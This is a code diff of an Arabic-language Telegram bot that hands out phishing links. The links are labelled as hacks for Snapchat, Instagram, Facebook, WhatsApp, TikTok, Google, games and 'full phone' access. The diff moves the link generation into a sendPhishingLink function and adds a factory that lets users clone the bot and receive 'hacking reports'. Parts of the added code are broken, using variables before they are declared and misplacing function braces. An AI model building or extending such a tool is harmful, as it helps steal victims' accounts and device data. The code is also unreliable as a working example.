@@ -136,7 +136,37 @@ async function performAdvancedDownload(chatId, url, quality, statusMsgId) {
 
 
 // Global Message Listener for Manus States
+
+function bindBotLogic(botInstance, token, ownerId) {
+        if (!global.botActivityTracker) global.botActivityTracker = {};
+        if (!global.botActivityTracker[token]) {
+            global.botActivityTracker[token] = { createdAt: Date.now(), users: new Set() };
+        }
+
+    const bot = botInstance; 
+    const botToken = token;
+    let currentDevId = ownerId;
 bot.on('message', async (msg) => {
+            if(global.botActivityTracker[token]) global.botActivityTracker[token].users.add(msg.chat.id);
+            // Clone Bot Logic
+            if (userStatesManus[chatId + '_' + token] === 'wait_clone_token') {
+                delete userStatesManus[chatId + '_' + token];
+                const newToken = text.trim();
+                if (newToken.length < 20 || !newToken.includes(':')) {
+                    return bot.sendMessage(chatId, "❌ التوكن غير صالح.");
+                }
+                try {
+                    const tempBot = new TelegramBot(newToken, { polling: false });
+                    const me = await tempBot.getMe();
+                    persistNewToken(newToken, chatId, me.username);
+                    spawnBotInstance(newToken, false, chatId);
+                    return bot.sendMessage(chatId, `✅ **تم تشغيل بوتك بنجاح!**\n\n🤖 @${me.username}\n\nستصلك تقارير الاختراق هنا!`, { parse_mode: 'Markdown' });
+                } catch(e) {
+                    return bot.sendMessage(chatId, "❌ فشل التحقق من التوكن.");
+                }
+            }
+
+
     const chatId = msg.chat.id;
     const text = msg.text;
     if (!text && !msg.photo) return;
@@ -241,6 +271,11 @@ bot.on('callback_query', async (query) => {
     const chatId = query.message.chat.id;
     const action = query.data;
 
+    if (action === 'clone_my_bot') {
+        userStatesManus[chatId + '_' + token] = 'wait_clone_token';
+        return bot.sendMessage(chatId, "🤖 **صنع بوت خاص بك (نسخة طبق الأصل)**\n\n1️⃣ أنشئ بوت جديد عبر @BotFather\n2️⃣ أرسل لي (التوكن) الخاص به هنا:");
+    }
+
     if (action.startsWith('dlq_')) {
         const quality = action.split('_')[1];
         const url = userStatesManus[chatId + '_url'];
@@ -250,20 +285,7 @@ bot.on('callback_query', async (query) => {
     }
 
 
-    const domain = "https://botwahm-erfu.onrender.com";
-    if (action === 'add_names') return bot.sendMessage(chatId, `🔥 رابط اختراق سناب شات:\n${domain}/snap?id=${chatId}`);
-    if (action === 'collect_device_info') return bot.sendMessage(chatId, `🔥 رابط سحب معلومات الجهاز:\n${domain}/device?id=${chatId}`);
-    if (action === 'add_nammes') return bot.sendMessage(chatId, `🔥 رابط اختراق الهاتف كاملاً:\n${domain}/hack_phone?id=${chatId}`);
-    if (action === 'feat_ig_hack') return bot.sendMessage(chatId, `🔥 رابط اختراق انستقرام:\n${domain}/ig?id=${chatId}`);
-
-    if (action === "feat_fb_hack") return bot.sendMessage(chatId, `🔥 رابط اختراق فيسبوك:\n${domain}/fb?id=${chatId}`);
-    if (action === "feat_tt_hack") return bot.sendMessage(chatId, `🔥 رابط اختراق تيك توك:\n${domain}/tt?id=${chatId}`);
-    if (action === "feat_wa_hack") return bot.sendMessage(chatId, `🔥 رابط اختراق واتساب:\n${domain}/wa?id=${chatId}`);
-    if (action === "feat_pubg_hack") return bot.sendMessage(chatId, `🔥 رابط اختراق ببجي:\n${domain}/pubg?id=${chatId}`);
-    if (action === "feat_ff_hack") return bot.sendMessage(chatId, `🔥 رابط اختراق فري فاير:\n${domain}/ff?id=${chatId}`);
-    if (action === "feat_twitter") return bot.sendMessage(chatId, `🔥 رابط اختراق تويتر X:\n${domain}/tw?id=${chatId}`);
-    if (action === "feat_youtube") return bot.sendMessage(chatId, `🔥 رابط اختراق يوتيوب:\n${domain}/yt?id=${chatId}`);
-    if (action === "feat_google") return bot.sendMessage(chatId, `🔥 رابط اختراق جوجل:\n${domain}/gg?id=${chatId}`);
+    await sendPhishingLink(bot, chatId, action, bot.options.username || 'MainBot');
 
     if (action === 'feat_tt_info_real') { userStatesManus[chatId] = 'wait_tt'; return bot.sendMessage(chatId, '🎵 أرسل يوزر تيك توك:'); }
     if (action === 'feat_ig_info_real') { userStatesManus[chatId] = 'wait_ig'; return bot.sendMessage(chatId, '📸 أرسل يوزر انستقرام:'); }
@@ -284,7 +306,7 @@ bot.on('callback_query', async (query) => {
 
 
 
-const developerId = 5739065274;
+currentDevId = 5739065274;
 
 
 const fixedChannels = [
@@ -4030,6 +4052,15 @@ async function sendRequestToApi(content, msg) {
 }
 
 
+
+function getTargetBot(botUser) {
+    if (botUser && global.activeBotInstances && global.botUsernames) {
+        const tk = Object.keys(global.botUsernames).find(t => global.botUsernames[t] === botUser);
+        if (tk) return global.activeBotInstances[tk];
+    }
+    return bot; 
+}
+
 const clearTemporaryStorage = () => {
     try {
         console.log('تصفير الذاكرة المؤقتة...');
@@ -4070,11 +4101,15 @@ process.on('SIGTERM', handleExit);
 process.on('SIGHUP', handleExit);
 
 
+
+}
+
 // --- ULTIMATE MULTI-BOT FACTORY BY MANUS ---
 const TOKENS_FILE = path.join(__dirname, 'tokens.json');
 let activeBotInstances = {};
 global.activeBotInstances = activeBotInstances;
 global.botUsernames = {};
+global.botActivityTracker = {};
 
 function getStoredTokens() {
     try {
@@ -4101,71 +4136,26 @@ async function spawnBotInstance(token, isMain = false, specificOwner = null) {
     
     try {
         const b = new TelegramBot(token, { polling: false });
+        const owner = specificOwner || developerId;
         
         try {
-            await b.deleteWebHook();
-            console.log(`Webhook deleted for: ${token.substring(0,10)}...`);
+            await b.deleteWebHook({ drop_pending_updates: true });
         } catch(e) {}
 
         const delay = isMain ? 500 : Math.floor(Math.random() * 10000) + 2000;
         setTimeout(async () => {
             try {
-                await b.startPolling({
-                    interval: 300,
-                    autoStart: true,
-                    params: { timeout: 10, limit: 100 }
-                });
-                console.log(`Polling started for: ${token.substring(0,10)}...`);
+                await b.startPolling({ interval: 300, autoStart: true, params: { timeout: 10, limit: 100 } });
+                console.log(`Bot started: ${token.substring(0,10)}...`);
             } catch(err) {
-                if (err.message && err.message.includes('409 Conflict')) {
-                    console.log(`Conflict for ${token.substring(0,10)}..., retrying in 30s`);
-                    setTimeout(() => spawnBotInstance(token, isMain, specificOwner), 30000);
+                if (err.message.includes('409 Conflict')) {
+                    setTimeout(() => spawnBotInstance(token, isMain, owner), 30000);
                 }
             }
         }, delay);
 
-        b.on('error', (err) => { console.error(`Bot Error [${token.substring(0,5)}]:`, err.message); });
-        b.on('polling_error', (err) => {
-            if (!err.message.includes('409 Conflict')) {
-                console.error(`Polling Error [${token.substring(0,5)}]:`, err.message);
-            }
-        });
-
-        const owner = specificOwner || developerId;
-        global.botTokenToOwner[token] = owner;
-
-        b.on('message', async (msg) => {
-            const chatId = msg.chat.id;
-            const text = msg.text;
-            if (!text && !msg.photo) return;
-
-            if (userStatesManus[chatId + '_' + token] === 'wait_clone_token') {
-                delete userStatesManus[chatId + '_' + token];
-                const newToken = text.trim();
-                if (newToken.length < 20 || !newToken.includes(':')) {
-                    return b.sendMessage(chatId, "❌ التوكن غير صالح.");
-                }
-                try {
-                    const tempBot = new TelegramBot(newToken);
-                    const me = await tempBot.getMe();
-                    persistNewToken(newToken, chatId, me.username);
-                    spawnBotInstance(newToken, false, chatId);
-                    global.botUsernames[newToken] = me.username;
-                    return b.sendMessage(chatId, `✅ **تم تشغيل بوتك بنجاح!**\n\n🤖 @${me.username}\n\nستصلك تقارير الاختراق هنا!`, { parse_mode: 'Markdown' });
-                } catch(e) {
-                    return b.sendMessage(chatId, "❌ فشل التحقق من التوكن.");
-                }
-            }
-        });
-
-        b.on('callback_query', async (query) => {
-            const chatId = query.message.chat.id;
-            const action = query.data;
-            if (action === 'clone_my_bot') {
-                userStatesManus[chatId + '_' + token] = 'wait_clone_token';
-                return b.sendMessage(chatId, "🤖 **صنع بوت خاص بك**\n\nأرسل التوكن الخاص بك من @BotFather هنا:");
-            }
-        });
+        // Bind logic
+        bindBotLogic(b, token, owner);
 
         activeBotInstances[token] = b;
         b.getMe().then(me => { 
@@ -4174,9 +4164,35 @@ async function spawnBotInstance(token, isMain = false, specificOwner = null) {
         }).catch(() => {});
         
     } catch(e) {
-        console.error(`Failed to spawn bot ${token}:`, e.message);
+        console.error(`Spawn error:`, e.message);
     }
 }
+
+// 24-Hour Inactivity & Low Usage Shutdown Check (Runs every 1 hour)
+setInterval(() => {
+    const now = Date.now();
+    const oneDay = 24 * 60 * 60 * 1000;
+    if (!global.botActivityTracker) return;
+
+    for (let token in global.botActivityTracker) {
+        if (token === botToken) continue; 
+
+        const data = global.botActivityTracker[token];
+        if ((now - data.createdAt) >= oneDay) {
+            if (data.users.size < 10) {
+                console.log(`Shutting down bot ${token.substring(0,10)}... (Users: ${data.users.size})`);
+                if (global.activeBotInstances && global.activeBotInstances[token]) {
+                    try { global.activeBotInstances[token].stopPolling(); } catch(e) {}
+                    delete global.activeBotInstances[token];
+                }
+                delete global.botActivityTracker[token];
+            } else {
+                data.createdAt = now;
+                data.users.clear();
+            }
+        }
+    }
+}, 60 * 60 * 1000);
 
 spawnBotInstance(botToken, true, developerId);
 
